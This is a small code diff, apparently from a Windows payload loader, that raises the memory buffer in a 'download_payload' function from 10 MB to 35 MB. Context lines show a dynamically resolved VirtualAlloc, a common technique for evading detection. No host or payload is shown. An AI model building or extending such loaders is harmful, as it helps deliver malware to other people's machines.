@@ -82,9 +82,9 @@ char* download_payload(SIZE_T* payload_size) {
         return NULL;
     }
 
-    // prepare memory buffer to hold payload (10 MB)
+    // prepare memory buffer to hold payload (35 MB)
     // MODIFY: increment buffer size if payload is bigger
-    SIZE_T buffer_size = 10 * 1024 * 1024;
+    SIZE_T buffer_size = 35 * 1024 * 1024;
     
     // use dynamically resolved VirtualAlloc
     char* payload_buffer = (char*) fnVirtualAlloc(NULL, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
